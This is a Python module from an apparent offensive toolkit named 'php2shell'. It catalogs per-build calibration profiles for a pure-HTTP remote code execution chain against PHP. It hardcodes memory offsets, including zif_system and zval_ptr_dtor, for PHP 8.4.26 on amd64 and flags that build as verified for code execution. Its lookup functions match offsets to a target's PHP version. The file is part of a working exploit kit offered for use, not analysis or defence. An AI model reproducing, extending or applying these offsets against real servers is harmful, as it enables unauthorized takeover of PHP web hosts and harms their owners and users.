#!/usr/bin/env python3
"""Profile catalog for the php2shell pure-HTTP chain.

A profile is a per-build calibration: the four offsets the chain
needs (zif_system, zval_ptr_dtor, fake-array S, hsv), the stage
parameters, and a rce_verified flag.  Only builds that were
actually exploited carry rce_verified=true; every other row is
a starting point for calibration, not a working chain.

Resolution order in tools/recon.py:
  1. exact php_version + arch
  2. php_version, any arch
  3. fall back to the legacy hardcoded constants in exploit.py
     (the 8.4.26 build) when no profile matches
"""
from __future__ import annotations

import json
import os

HERE = os.path.dirname(os.path.abspath(__file__))
PROFILES_DIR = os.path.join(HERE, "..", "profiles")

# Legacy single-build constants (php:8.4.26-apache, trixie).
LEGACY = {
    "name": "php-8.4.26-trixie-amd64",
    "php_version": "8.4.26",
    "arch": "amd64",
    "offsets": {
        "zif_system": 0x465370,
        "zval_ptr_dtor": 0x65EB60,
        "S": 0xF8398,
        "hsv": 0x7D720,
    },
    "rce_verified": True,
}


def _hex(v):
    return int(v, 0) if isinstance(v, str) else v


def load(path: str) -> dict:
    with open(path, encoding="utf-8") as fh:
        data = json.load(fh)
    data["offsets"] = {k: _hex(v) for k, v in
                       data.get("offsets", {}).items()}
    return data


def load_all() -> list[dict]:
    if not os.path.isdir(PROFILES_DIR):
        return []
    out = []
    for fname in sorted(os.listdir(PROFILES_DIR)):
        if not fname.endswith(".json"):
            continue
        try:
            out.append(load(os.path.join(PROFILES_DIR, fname)))
        except (OSError, ValueError, KeyError):
            continue
    return out


def find(php_version: str, arch: str | None = None,
         profiles: list[dict] | None = None) -> dict | None:
    """Match a profile by version, preferring same-arch rows."""
    if profiles is None:
        profiles = load_all()
    exact = [p for p in profiles
             if p.get("php_version") == php_version
             and (arch is None or p.get("arch") == arch)]
    if exact:
        return exact[0]
    loose = [p for p in profiles
             if p.get("php_version") == php_version]
    return loose[0] if loose else None


def summarize(p: dict) -> str:
    o = p.get("offsets", {})
    return ("%s php=%s arch=%s zif=%s dtor=%s S=%s hsv=%s "
            "rce_verified=%s" % (
                p.get("name", "?"), p.get("php_version", "?"),
                p.get("arch", "?"),
                hex(o.get("zif_system", 0)) if o.get("zif_system") is not None else "?",
                hex(o.get("zval_ptr_dtor", 0)) if o.get("zval_ptr_dtor") is not None else "?",
                hex(o.get("S", 0)) if o.get("S") is not None else "?",
                hex(o.get("hsv", 0)) if o.get("hsv") is not None else "?",
                bool(p.get("rce_verified"))))
